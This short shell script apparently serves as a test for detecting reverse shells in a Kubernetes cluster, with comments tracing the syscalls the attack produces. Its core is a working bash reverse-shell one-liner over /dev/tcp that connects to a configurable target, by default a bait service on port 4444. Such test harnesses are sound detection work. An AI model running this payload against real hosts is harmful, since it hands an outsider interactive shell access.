#!/bin/sh
# Reverse-shell pattern: bash spawns a TCP connect back to attacker, then
# duplicates fds so the shell talks over the socket. The syscall trace is
# socket → connect → dup2 → execve(/bin/sh) → repeated read/write.
#
# In our test it connects to a `nc -l` listener in another pod.
TARGET="${TARGET:-bait.demo.svc.cluster.local}"
PORT="${PORT:-4444}"
echo "[*] Attempting reverse shell to ${TARGET}:${PORT}"
# Use bash for /dev/tcp redirection
bash -c "bash -i >& /dev/tcp/${TARGET}/${PORT} 0>&1" &
SHELL_PID=$!
sleep 8
kill -9 $SHELL_PID 2>/dev/null || true
echo "[*] Reverse-shell window closed"
